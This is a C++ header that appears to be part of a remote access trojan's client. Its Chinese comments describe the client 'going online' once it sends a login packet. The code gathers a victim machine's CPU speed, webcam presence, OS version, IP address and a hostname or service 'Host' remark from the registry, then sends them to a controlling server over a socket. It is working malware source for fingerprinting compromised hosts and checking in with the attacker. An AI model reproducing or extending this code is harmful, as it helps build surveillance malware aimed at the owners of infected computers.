// SendLoginImfor.h: interface for the SendLoginImfor class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SENDLOGINIMFOR_H__9A4BB614_B4EF_4D53_A69A_666B92332B7E__INCLUDED_)
#define AFX_SENDLOGINIMFOR_H__9A4BB614_B4EF_4D53_A69A_666B92332B7E__INCLUDED_
#include "EncodingUtil.h"

// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), &hKey);
    RegQueryValueEx(hKey, TEXT("~MHz"), NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool	bRet = false;

	TCHAR	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
        bRet = CKeyboardManager::MycapGetDriverDescription(i, lpszName, ARRAYSIZE(lpszName), lpszVer, ARRAYSIZE(lpszVer));
	}

	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	TCHAR	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
//	char str1[50] = "KAKJ5MB;ehhUlj;oljhoRKUjBKUhdQ[UkB";
//	EncryptData( (unsigned char *)&str1, 0, 12 );
//	lstrcat( str1, lpServiceName );
//	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\", lpServiceName);
	lstrcpy( strSubKey, TEXT("SYSTEM\\CurrentControlSet\\Services\\") );
	lstrcat( strSubKey, lpServiceName );
    ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, TEXT("Host"), REG_SZ, (TCHAR *)lpBuffer, NULL, uSize, 0);

    if (lstrlen(lpBuffer) == 0)
    {
        char szHostName[256] = { 0 };
        gethostname(szHostName, ARRAYSIZE(szHostName));
        EncodeUtil::AnsiToUnicode(szHostName, lpBuffer, uSize);
    }
		
	
	return lstrlen(lpBuffer);
}

int sendLoginInfo_true(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed )
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN_TRUE; // 令牌为登录，真登陆，发送后客户端上线
	
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	// 主机名
	TCHAR hostname[256];
	GetHostRemark(strServiceName, hostname, ARRAYSIZE(hostname));
	
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
    char szHostNameUtf8[256] = { 0 };
    EncodeUtil::UnicodeToUtf8(hostname, szHostNameUtf8, ARRAYSIZE(szHostNameUtf8));
    memcpy(&LoginInfo.HostName, szHostNameUtf8, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	LoginInfo.dwSpeed = dwSpeed;
	LoginInfo.SerVer = 20100204;

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}

#endif // !defined(AFX_SENDLOGINIMFOR_H__9A4BB614_B4EF_4D53_A69A_666B92332B7E__INCLUDED_)
